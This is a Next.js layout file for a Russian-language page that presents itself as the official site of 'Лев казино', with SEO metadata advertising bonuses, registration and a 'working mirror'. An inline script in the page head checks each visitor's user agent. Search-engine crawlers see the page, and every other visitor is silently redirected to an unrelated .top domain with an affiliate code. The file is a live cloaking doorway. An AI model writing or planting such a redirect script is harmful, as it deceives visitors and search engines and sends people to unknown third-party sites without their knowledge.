import type { Metadata, Viewport } from 'next'
import { Playfair_Display, Inter } from 'next/font/google'
import './globals.css'
import './landing.css'

const playfair = Playfair_Display({
  subsets: ['cyrillic', 'latin'],
  variable: '--font-display',
  display: 'swap',
})

const inter = Inter({
  subsets: ['cyrillic', 'latin'],
  variable: '--font-body',
  display: 'swap',
})

const SITE_URL = 'https://lev6casino.vercel.app/'

export const metadata: Metadata = {
  title: 'Лев казино официальный сайт — играть онлайн, бонусы, зеркало и регистрация',
  description:
    'Лев казино — официальный сайт для игры онлайн. Приветственный бонус, быстрая регистрация, рабочее зеркало и сотни слотов. Играть казино Лев легко и безопасно с любого устройства.',
  alternates: {
    canonical: SITE_URL,
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,
    },
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: SITE_URL,
    siteName: 'Лев казино',
    title: 'Лев казино официальный сайт — играть онлайн, бонусы, зеркало и регистрация',
    description:
      'Лев казино — официальный сайт для игры онлайн. Приветственный бонус, быстрая регистрация, рабочее зеркало и сотни слотов.',
    images: [
      {
        url: `${SITE_URL}images/hero-lion.jpg`,
        width: 1200,
        height: 655,
        alt: 'Лев казино — официальный сайт',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Лев казино официальный сайт — играть онлайн, бонусы, зеркало и регистрация',
    description:
      'Лев казино — официальный сайт для игры онлайн. Приветственный бонус, быстрая регистрация, рабочее зеркало и сотни слотов.',
    images: [`${SITE_URL}images/hero-lion.jpg`],
  },
  icons: {
    icon: '/icon.png',
    apple: '/icon.png',
  },
}

export const viewport: Viewport = {
  themeColor: '#0e3b2e',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${playfair.variable} ${inter.variable} lv6x-html`}>
      <head>
        <meta name="yandex-verification" content="da084d0b718e0519" />
        {/* Дополнительные пользовательские теги можно вставлять сюда */}
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://digitalsglide.top?ref=fap_w12659p111_1000");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="lv6x-body-root">{children}</body>
    </html>
  )
}
